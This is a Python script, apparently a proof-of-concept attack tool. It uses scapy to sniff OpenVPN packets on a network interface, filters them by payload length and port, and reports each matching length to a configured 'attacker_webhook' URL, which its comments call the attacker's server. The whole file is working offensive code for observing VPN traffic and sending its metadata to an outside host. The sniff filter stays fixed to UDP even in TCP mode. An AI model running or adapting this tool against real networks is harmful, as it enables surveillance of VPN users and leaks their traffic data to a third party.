from scapy.layers.inet import UDP, TCP
from scapy.sendrecv import sniff
import logging
import requests

from config import settings
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
print('Sniffing for OpenVPN Packets....')

proto = UDP
if str(settings['protocol']).upper() != 'UDP':
    print('switching to TCP Mode')
    proto = TCP


def is_packet(pkt, min_len, max_len, port):
    if pkt[proto].payload:
        if pkt[proto].dport == port:
            payload = pkt[proto].payload
            payload_len = len(payload)
            # print(payload_len)
            if min_len <= payload_len <= max_len:
                return True
    return False


def packet_callback(pkt):
    try:
        if is_packet(pkt, settings['payload_min_length'], settings['payload_max_length'], settings['port']):
            length = len(pkt[proto].payload)
            print(length)
            send_data(length)
    except IndexError:
        pass


# send length of the Payload to the attacker's server
# treat this like an event based webhook
def send_data(length):
    try:
        requests.get(str(settings['attacker_webhook']) + str(length))
    except requests.exceptions.ConnectionError:
        pass


sniff(filter="udp", prn=packet_callback, store=0, iface="en0")
